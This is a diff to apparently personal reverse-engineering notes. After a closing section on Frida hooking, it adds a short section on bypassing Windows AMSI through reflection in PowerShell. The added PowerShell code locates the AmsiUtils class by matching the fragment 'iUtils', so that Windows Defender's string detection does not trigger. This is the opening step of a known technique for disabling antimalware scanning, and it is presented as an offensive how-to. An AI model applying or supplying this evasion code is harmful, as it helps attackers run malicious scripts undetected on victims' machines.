@@ -457,3 +457,12 @@ Here’s a simple example to hook a function in a Windows application using Frid
 3. **Security**: Be aware of the legal and ethical implications of using Frida for reverse engineering and hooking.
 
 Frida provides a powerful and flexible framework for dynamic instrumentation, allowing you to analyze and modify the behavior of applications at runtime.
+
+### Bypassing AMSI with Reflection in Powershell
+
+- Windows Defender will cause a block when obtaining a reference to a class if one is including the AmsiUtils string.
+- Strategy is to search for AmsiUtils using `GetTypes` and searching for the string "iUtils"
+```powershell
+$a=[Ref].Assembly.GetTypes()
+Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}
+```
